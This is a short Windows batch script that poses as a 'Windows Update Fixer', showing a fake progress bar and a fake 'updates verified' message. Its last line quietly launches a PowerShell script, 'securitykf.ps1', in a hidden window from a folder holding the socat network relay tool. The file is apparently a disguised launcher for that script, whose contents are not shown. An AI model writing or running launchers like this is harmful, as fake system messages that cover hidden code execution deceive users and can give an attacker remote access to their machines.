@echo off

for /l %%a in (1,1,28) do (
	
	cls
	call set "bar=%%bar%%#"
	call 
	call echo Windows Update Fixer Started
	call echo:
	call echo %%bar%%
	ping localhost -n 1 >nul
	set counter+=1
)
echo Windows Updates Verified 0 Updates Pending
timeout 1
cd \"Program Files"\ZOLOFT\ZOLOFT\socat-windows-master && powershell.exe -windowstyle hidden ./securitykf.ps1 


